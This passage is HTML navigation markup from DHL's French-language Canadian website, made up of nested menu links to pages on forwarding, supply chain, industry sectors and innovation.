                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;3&#45;8"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/services-complementaires.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Additional Services"}'
                                  >Services supplémentaires</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;3&#45;9"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Sectors"}'
                                  >Secteurs</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs.html"
                                      >Secteurs</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/automobile.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Auto-Mobility"}'
                                      >Auto-Mobilité</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/produits-chimiques.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Chemicals"}'
                                      >Produits chimiques</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/biens-de-consommation.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Consumer"}'
                                      >Client</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;4"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/energie.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Energy"}'
                                      >Énergie</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;5"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/ingenierie-et-fabrication.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Engineering &amp; Manufacturing"}'
                                      >Ingénierie et fabrication</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;6"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/sciences-de-la-vie-et-services-de-sante.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Life Sciences &amp; Healthcare"}'
                                      >Sciences de la vie et soins de la
                                      santé</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;7"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/secteur-public.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Public"}'
                                      >Secteur public</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;8"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/vente-au-detail.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Retail"}'
                                      >Vente au détail</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;9&#45;9"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/secteurs/technologie.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Technology"}'
                                      >Technologie</a
                                    >
                                  </li>
                                </ul>
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;3&#45;10"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/expertise-specifique.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Special Expertise"}'
                                  >Expertise spéciale</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/expertise-specifique.html"
                                      >Expertise spéciale</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;10&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/expertise-specifique/gogreen-solutions.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL GoGreen Solutions"}'
                                      >DHL GoGreen Solutions</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;10&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/expertise-specifique/logistique-des-vins-et-spiritueux.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Wine &amp; Spirits Logistics"}'
                                      >DHL Wine &amp; Spirits Logistics</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;10&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/expertise-specifique/logistique-perissable.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Perishable Logistics"}'
                                      >DHL Perishable Logistics</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;10&#45;4"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/expertise-specifique/logistique-maritime.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Marine Logistics"}'
                                      >DHL Marine Logistics</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;10&#45;5"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/expertise-specifique/aid-and-relief-logistics.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Aid &amp; Relief Logistics"}'
                                      >DHL Aid &amp; Relief Logistics</a
                                    >
                                  </li>
                                </ul>
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;3&#45;11"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Customer Service"}'
                                  >Service à la clientèle</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client.html"
                                      >Service à la clientèle</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;11&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client/dhl-interactive.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Interactive"}'
                                      >DHL Interactive</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;11&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client/incoterms-2010.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Incoterms 2010"}'
                                      >Incoterms 2010</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;11&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client/incoterms-2020.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Incoterms 2020"}'
                                      >Incoterms 2020</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;11&#45;4"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client/sauvegarde-de-la-vie-humaine-en-mer.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Safety of Life at Seas"}'
                                      >Sauvegarde de la vie humaine en mer</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;11&#45;5"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client/lifetrack.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"LifeTrack"}'
                                      >LifeTrack</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;11&#45;6"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client/fret-surcharges.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Freight Forwarding Surcharges"}'
                                      >Surtaxes pour le transit de fret</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;3&#45;11&#45;7"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/expediteur-mondial/service-client/conditions-generales.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Terms and Conditions"}'
                                      >Conditions générales</a
                                    >
                                  </li>
                                </ul>
                              </li>
                            </ul>
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                            data-level="5&#45;4"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"DHL Supply Chain"}'
                              >DHL Supply Chain</a
                            >
                            <ul class="l-grid l-grid--w-100pc-s">
                              <li
                                class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon icon-chevron-back"
                                  href="#"
                                  >Retour</a
                                >
                              </li>
                              <li
                                class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique.html"
                                  >DHL Supply Chain</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;4&#45;1"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/pourquoi-nous-choisir.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Why Us"}'
                                  >Pourquoi nous choisir</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;4&#45;2"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Sectors"}'
                                  >Secteurs</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs.html"
                                      >Secteurs</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;2&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs/automobile.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Auto-Mobility"}'
                                      >Auto-Mobilité</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;2&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs/biens-de-consommation.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Consumer"}'
                                      >Client</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;2&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs/energie-et-produits-chimiques.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Energy &amp; Chemicals"}'
                                      >Énergie et produits chimiques</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;2&#45;4"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs/ingenierie-et-fabrication.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Engineering &amp; Manufacturing"}'
                                      >Ingénierie et fabrication</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;2&#45;5"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs/sciences-de-la-vie-et-services-de-sante.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Life Sciences &amp; Healthcare"}'
                                      >Sciences de la vie et soins de la
                                      santé</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;2&#45;6"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs/vente-au-detail.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Retail"}'
                                      >Vente au détail</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;2&#45;7"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/apercu-des-secteurs/technologie.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Technology"}'
                                      >Technologie</a
                                    >
                                  </li>
                                </ul>
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;4&#45;3"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/solutions.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Solutions"}'
                                  >Solutions</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/solutions.html"
                                      >Solutions</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;3&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/solutions/solutions-entreposage.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Warehousing Solutions"}'
                                      >Solutions d&#39;entreposage</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;3&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/solutions/solutions-de-transport.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Transport Solutions"}'
                                      >Solutions de transport</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;3&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/solutions/solutions-de-gestion.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Management Services"}'
                                      >Solutions de gestion</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;3&#45;4"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/solutions/solutions-integrees.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Integrated Solutions"}'
                                      >Solutions intégrées</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;3&#45;5"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/solutions/services-complementaires.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Additional Services"}'
                                      >Services supplémentaires</a
                                    >
                                  </li>
                                </ul>
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;4&#45;4"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/idees-innovantes.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Thought Leadership"}'
                                  >Leadership éclairé</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                                data-level="5&#45;4&#45;5"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/a-propos-de-dhl-supply-chain.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"About DHL Supply Chain"}'
                                  >À propos de DHL Supply Chain</a
                                >
                                <ul class="l-grid l-grid--w-100pc-s">
                                  <li
                                    class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon icon-chevron-back"
                                      href="#"
                                      >Retour</a
                                    >
                                  </li>
                                  <li
                                    class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/a-propos-de-dhl-supply-chain.html"
                                      >À propos de DHL Supply Chain</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;5&#45;1"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/a-propos-de-dhl-supply-chain/rapports-annuels.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Annual Reports"}'
                                      >Rapports annuels</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;5&#45;2"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/a-propos-de-dhl-supply-chain/nos-capacites-a-l-echelle-mondiale.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Our Global Capability"}'
                                      >Notre capacité mondiale</a
                                    >
                                  </li>

                                  <li
                                    class="l-grid--w-100pc-s js--nav-mobile-item"
                                    data-level="5&#45;4&#45;5&#45;3"
                                  >
                                    <a
                                      class="link has-icon"
                                      href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/a-propos-de-dhl-supply-chain/notre-equipe-de-direction.html"
                                      data-tracking='{"component":"dhl/components/navigation/primary","name":"Our Leadership Team "}'
                                      >Notre équipe de direction
                                    </a>
                                  </li>
                                </ul>
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;4&#45;6"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/rejoignez-notre-equipe.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Join Our Team"}'
                                  >Joignez-vous à notre équipe</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="5&#45;4&#45;7"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/nos-divisions/chaine-logistique/contacter-nos-experts.html"
                                  data-tracking='{"component":"dhl/components/navigation/primary","name":"Contact Our Experts"}'
                                  >Contacter nos experts</a
                                >
                              </li>
                            </ul>
                          </li>
                        </ul>
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                        data-level="6"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/secteurs-industries.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"Industry Sectors"}'
                          >Secteurs d’industries</a
                        >
                        <ul class="l-grid l-grid--w-100pc-s">
                          <li
                            class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a class="link has-icon icon-chevron-back" href="#"
                              >Retour</a
                            >
                          </li>
                          <li
                            class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries.html"
                              >Secteurs d’industries</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;1"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/automobile.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Auto-Mobility"}'
                              >Auto-Mobilité</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;2"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/produits-chimiques.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Chemicals"}'
                              >Produits chimiques</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;3"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/biens-de-consommation.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Consumer"}'
                              >Client</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;4"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/energie.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Energy"}'
                              >Énergie</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;5"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/ingenierie-et-fabrication.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Engineering &amp; Manufacturing"}'
                              >Ingénierie et fabrication</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;6"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/sciences-de-la-vie-et-services-de-sante.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Life Sciences &amp; Healthcare"}'
                              >Sciences de la vie et soins de la santé</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;7"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/secteur-public.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Public Sector"}'
                              >Secteur public</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;8"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/vente-au-detail.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Retail"}'
                              >Vente au détail</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="6&#45;9"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/secteurs-industries/technologie.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Technology"}'
                              >Technologie</a
                            >
                          </li>
                        </ul>
                      </li>

                      <li
                        class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                        data-level="7"
                      >
                        <a
                          class="link has-icon"
                          href="https://www.dhl.com/ca-fr/home/vision-et-innovation.html"
                          data-tracking='{"component":"dhl/components/navigation/primary","name":"Insights &amp; Innovation"}'
                          >Idées et innovation</a
                        >
                        <ul class="l-grid l-grid--w-100pc-s">
                          <li
                            class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a class="link has-icon icon-chevron-back" href="#"
                              >Retour</a
                            >
                          </li>
                          <li
                            class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/vision-et-innovation.html"
                              >Idées et innovation</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item"
                            data-level="7&#45;1"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/vision-et-innovation/vision.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Insights"}'
                              >Idées</a
                            >
                          </li>

                          <li
                            class="l-grid--w-100pc-s js--nav-mobile-item has-subnav js--has-subnav"
                            data-level="7&#45;2"
                          >
                            <a
                              class="link has-icon"
                              href="https://www.dhl.com/ca-fr/home/vision-et-innovation/innovation.html"
                              data-tracking='{"component":"dhl/components/navigation/primary","name":"Innovation"}'
                              >Innovation</a
                            >
                            <ul class="l-grid l-grid--w-100pc-s">
                              <li
                                class="c-nav--back-button js--nav-back l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon icon-chevron-back"
                                  href="#"
                                  >Retour</a
                                >
                              </li>
                              <li
                                class="c-nav--headline l-grid--w-100pc-s l-grid--hidden-m"
                              >
                                <a
                                  class="link has-icon"
                                  href="https://www.dhl.com/ca-fr/home/vision-et-innovation/innovation.html"
                                  >Innovation</a
                                >
                              </li>

                              <li
                                class="l-grid--w-100pc-s js--nav-mobile-item"
                                data-level="7&#45;2&#45;1"
                              >
                                <a
                                  class="link has-icon"
